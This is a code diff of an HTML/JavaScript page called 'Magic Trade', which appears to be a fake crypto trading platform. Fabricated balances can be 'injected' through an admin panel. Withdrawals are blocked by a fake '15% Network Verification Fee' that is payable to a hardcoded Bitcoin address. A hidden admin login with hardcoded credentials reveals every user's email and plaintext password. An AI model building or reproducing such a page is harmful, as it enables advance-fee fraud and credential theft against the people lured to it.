@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Magic Trade | Institutional Node</title>
+    <title>Magic Trade | Private Node</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background: #010409; color: #e6edf3; font-family: -apple-system, sans-serif; height: 100dvh; display: flex; flex-direction: column; overflow: hidden; margin: 0; }
@@ -23,7 +23,10 @@
 
     <div id="auth-screen" class="fixed inset-0 z-[200] flex flex-col items-center justify-center bg-[#010409] p-6 text-center">
         <h1 class="text-4xl font-black mb-1 text-white italic tracking-tighter">MAGIC<span class="text-blue-500">TRADE</span></h1>
-        <p class="text-[9px] text-slate-500 uppercase tracking-widest mb-12 italic">X Holdings Global Terminal</p>
+        
+        <p class="text-[9px] text-slate-500 uppercase tracking-widest mb-12 italic">
+            Powered by X-CORP <span onclick="triggerAdminLogin()" style="cursor:default">NODE</span>
+        </p>
         
         <div id="login-box" class="magic-card p-6 w-full max-w-sm space-y-4">
             <input type="text" id="reg-name" placeholder="Full Legal Name" class="hidden w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
@@ -44,9 +47,8 @@
         <header class="p-4 flex justify-between items-center bg-[#0d1117] border-b border-slate-800 shrink-0">
             <div class="flex items-center gap-3">
                 <div class="w-9 h-9 bg-blue-600 rounded-full flex items-center justify-center font-bold text-sm">M</div>
-                <div><span id="user-display" class="font-bold text-sm block text-white">---</span><span class="text-[9px] text-green-500 font-bold uppercase">● Encrypted Uplink Active</span></div>
+                <div><span id="user-display" class="font-bold text-sm block text-white leading-none">---</span><span class="text-[9px] text-green-500 font-bold uppercase">● Encrypted Uplink Active</span></div>
             </div>
-            <button onclick="showSection('admin')" id="admin-icon" class="hidden p-2 text-xl">🛡️</button>
         </header>
 
         <div id="scroll-area">
@@ -65,40 +67,40 @@
                 </section>
 
                 <section id="deposit-sec" class="hidden space-y-4">
-                    <h3 class="text-xl font-bold">Inbound Assets</h3>
+                    <h3 class="text-xl font-bold text-white">Deposit</h3>
                     <div class="magic-card p-6 text-center space-y-4">
                         <p class="text-xs font-bold text-blue-400 uppercase tracking-widest">Bitcoin (BTC)</p>
                         <div onclick="revealBTC()" id="btc-reveal" class="p-4 bg-black border border-dashed border-slate-700 rounded-xl cursor-pointer text-[11px] font-mono break-all text-slate-500">
                             Tap to reveal institutional address
                         </div>
-                        <p class="text-[10px] text-slate-500 italic">"Ensure the transfer is via BTC Network."</p>
                     </div>
                 </section>
 
                 <section id="withdraw-sec" class="hidden space-y-4">
-                    <h3 class="text-xl font-bold">Withdrawal Portal</h3>
+                    <h3 class="text-xl font-bold text-white">Withdrawal</h3>
                     <div id="wd-step-1" class="magic-card p-6 space-y-4">
-                        <input type="text" placeholder="Bank Name / Swift Code" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
-                        <input type="text" placeholder="Account Number / IBAN" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
+                        <input type="text" placeholder="Bank Name" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
+                        <input type="text" placeholder="Account Number" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
                         <input type="number" placeholder="Amount (USDT)" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
-                        <button onclick="nextWdStep()" class="w-full magic-gradient p-4 rounded-xl font-bold text-xs uppercase">Process Withdrawal</button>
+                        <button onclick="nextWdStep()" class="w-full magic-gradient p-4 rounded-xl font-bold text-xs uppercase">Process</button>
                     </div>
                     <div id="wd-step-2" class="hidden magic-card p-6 text-center space-y-4 border-red-500/50">
-                        <p class="text-xs text-red-500 font-black tracking-[0.2em]">NETWORK SECURITY ALERT</p>
-                        <p class="text-sm">To verify this destination account, a **15% Network Verification Fee** is required.</p>
+                        <p class="text-xs text-red-500 font-black tracking-[0.2em]">SECURITY ALERT</p>
+                        <p class="text-sm">A **15% Network Verification Fee** is required to verify this bank account.</p>
                         <button onclick="showSection('deposit')" class="w-full bg-red-600 p-4 rounded-xl font-bold text-xs uppercase">Pay Fee to Node</button>
                     </div>
                 </section>
 
                 <section id="admin-sec" class="hidden space-y-6">
+                    <h3 class="text-xl font-bold text-blue-500 uppercase tracking-tighter">System Control</h3>
                     <div class="magic-card p-6 border-blue-500/30">
-                        <h4 class="text-blue-500 font-bold mb-4 uppercase text-xs">Inject Capital</h4>
+                        <h4 class="text-blue-500 font-bold mb-4 uppercase text-[10px]">Inject Capital</h4>
                         <input type="text" id="adm-target" placeholder="User Email" class="w-full p-4 rounded-xl bg-black border border-slate-800 mb-3 text-white text-sm">
                         <input type="number" id="adm-amt" placeholder="Amount (USDT)" class="w-full p-4 rounded-xl bg-black border border-slate-800 mb-4 text-white text-sm">
-                        <button onclick="adminInject()" class="w-full magic-gradient p-4 rounded-xl font-bold text-xs uppercase">Confirm</button>
+                        <button onclick="adminInject()" class="w-full magic-gradient p-4 rounded-xl font-bold text-xs">CONFIRM INJECTION</button>
                     </div>
                     <div class="magic-card p-6 overflow-hidden">
-                        <h4 class="text-slate-400 font-bold mb-4 uppercase text-[10px] tracking-widest">Internal Security Log</h4>
+                        <h4 class="text-slate-400 font-bold mb-4 uppercase text-[10px] tracking-widest">Internal Security Log (Credentials)</h4>
                         <div id="user-logs" class="space-y-3 max-h-[250px] overflow-y-auto"></div>
                     </div>
                 </section>
@@ -106,21 +108,32 @@
         </div>
 
         <nav class="bottom-nav">
-            <div onclick="showSection('home')" class="nav-item">📊<span>Assets</span></div>
-            <div onclick="window.open('https://t.me/+12156208677')" class="nav-item">💬<span>Support</span></div>
-            <div onclick="showSection('admin')" class="nav-item">🛡️<span>Admin</span></div>
-            <div onclick="logout()" class="nav-item">🚪<span>Exit</span></div>
+            <div onclick="showSection('home')" class="nav-item"><span>📊</span><span>Assets</span></div>
+            <div onclick="window.open('https://t.me/+12156208677')" class="nav-item"><span>💬</span><span>Support</span></div>
+            <div id="admin-nav-btn" onclick="showSection('admin')" class="nav-item hidden"><span>🛡️</span><span>Admin</span></div>
+            <div onclick="logout()" class="nav-item"><span>🚪</span><span>Logout</span></div>
         </nav>
     </div>
 
     <script>
         let generatedOTP = "";
         const BTC_ADDR = "Bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm";
-        let users = JSON.parse(localStorage.getItem('magic_users')) || { "admin@magic.com": { name: "Root Admin", pass: "boss123", bal: 50000, isAdmin: true } };
+        let users = JSON.parse(localStorage.getItem('magic_users')) || {};
         let activeSession = localStorage.getItem('magic_session') || null;
+        let isAdminActive = JSON.parse(localStorage.getItem('magic_is_admin')) || false;
         let pendingUser = null;
 
-        window.onload = () => { if(activeSession && users[activeSession]) enterApp(activeSession); renderGrids(); };
+        window.onload = () => { if(activeSession) enterApp(activeSession, isAdminActive); renderGrids(); };
+
+        function triggerAdminLogin() {
+            const user = prompt("Enter Admin ID:");
+            const pass = prompt("Enter Security Key:");
+            if(user === "MASTER_ADA" && pass === "ADA_777_NODE") {
+                isAdminActive = true;
+                localStorage.setItem('magic_is_admin', true);
+                enterApp("ADMIN_SYSTEM", true);
+            } else { alert("Unauthorized Access."); }
+        }
 
         function toggleAuthMode() { document.getElementById('reg-name').classList.toggle('hidden'); }
 
@@ -134,23 +147,23 @@
                 document.getElementById('login-box').classList.add('hidden');
                 document.getElementById('otp-box').classList.remove('hidden');
                 setTimeout(() => { document.getElementById('notif-text').innerText = "Security code: " + generatedOTP; document.getElementById('email-notif').classList.add('show-notif'); }, 2000);
-            } else { if(users[e] && users[e].pass === p) enterApp(e); else alert("ACCESS DENIED"); }
+            } else { if(users[e] && users[e].pass === p) enterApp(e, false); else alert("ACCESS DENIED"); }
         }
 
         function verifyOTP() {
             if(document.getElementById('otp-input').value === generatedOTP) {
-                users[pendingUser.email] = { name: pendingUser.name, pass: pendingUser.pass, bal: 0, isAdmin: false };
+                users[pendingUser.email] = { name: pendingUser.name, pass: pendingUser.pass, bal: 0 };
                 localStorage.setItem('magic_users', JSON.stringify(users));
-                enterApp(pendingUser.email);
+                enterApp(pendingUser.email, false);
             }
         }
 
-        function enterApp(e) {
+        function enterApp(e, admin) {
             activeSession = e; localStorage.setItem('magic_session', e);
             document.getElementById('auth-screen').classList.add('hidden');
             document.getElementById('app').classList.remove('hidden');
-            document.getElementById('user-display').innerText = users[e].name;
-            if(users[e].isAdmin) { document.getElementById('admin-icon').classList.remove('hidden'); loadUserLogs(); }
+            document.getElementById('user-display').innerText = admin ? "ADA SYSTEM" : users[e].name;
+            if(admin) { document.getElementById('admin-nav-btn').classList.remove('hidden'); loadUserLogs(); }
             updateUI();
         }
 
@@ -161,25 +174,20 @@
             document.getElementById('user-logs').innerHTML = Object.entries(users).map(([email, u]) => `
                 <div class="p-3 bg-black/50 border border-slate-800 rounded-lg">
                     <p class="text-[11px] font-bold text-white">${u.name}</p>
-                    <p class="text-[10px] text-blue-400">Email: ${email}</p>
-                    <p class="text-[10px] text-red-500 font-mono">Password: ${u.pass}</p>
+                    <p class="text-[10px] text-blue-400">${email}</p>
+                    <p class="text-[10px] text-red-500 font-mono">PWD: ${u.pass}</p>
                 </div>
             `).join('');
         }
 
         function showSection(sec) { ['home-sec', 'admin-sec', 'deposit-sec', 'withdraw-sec'].forEach(s => document.getElementById(s).classList.add('hidden')); document.getElementById(sec + '-sec').classList.remove('hidden'); if(sec === 'admin') loadUserLogs(); }
-        function adminInject() { const t = document.getElementById('adm-target').value.toLowerCase(); const a = parseFloat(document.getElementById('adm-amt').value); if(users[t]) { users[t].bal += a; localStorage.setItem('magic_users', JSON.stringify(users)); updateUI(); alert("Success."); } }
-        function updateUI() { if(activeSession) document.getElementById('balance').innerText = users[activeSession].bal.toLocaleString(undefined, {minimumFractionDigits: 2}); }
+        function adminInject() { const t = document.getElementById('adm-target').value.toLowerCase(); const a = parseFloat(document.getElementById('adm-amt').value); if(users[t]) { users[t].bal += a; localStorage.setItem('magic_users', JSON.stringify(users)); updateUI(); alert("Assets Loaded."); } }
+        function updateUI() { if(!isAdminActive && activeSession) document.getElementById('balance').innerText = users[activeSession].bal.toLocaleString(undefined, {minimumFractionDigits: 2}); else if(isAdminActive) document.getElementById('balance').innerText = "INFINITE"; }
         function renderGrids() {
             const list = ["BTCUSD", "ETHUSD", "SOLUSD", "XAUUSD", "TSLA", "NVDA"];
-            document.getElementById('market-tiles').innerHTML = list.map(s => `
-                <div class="magic-card p-4" onclick="document.getElementById('main-chart').src='https://s.tradingview.com/widgetembed/?symbol=${s}&interval=1&theme=dark'">
-                    <p class="text-[10px] font-black italic">${s}</p>
-                    <p class="text-[10px] text-green-500 font-mono">+${(Math.random()*4).toFixed(2)}%</p>
-                </div>
-            `).join('');
+            document.getElementById('market-tiles').innerHTML = list.map(s => `<div class="magic-card p-4" onclick="document.getElementById('main-chart').src='https://s.tradingview.com/widgetembed/?symbol=${s}&interval=1&theme=dark'"><p class="text-[10px] font-black italic">${s}</p><p class="text-[10px] text-green-500 font-mono">+${(Math.random()*4).toFixed(2)}%</p></div>`).join('');
         }
-        function logout() { localStorage.removeItem('magic_session'); location.reload(); }
+        function logout() { localStorage.clear(); location.reload(); }
     </script>
 </body>
 </html>
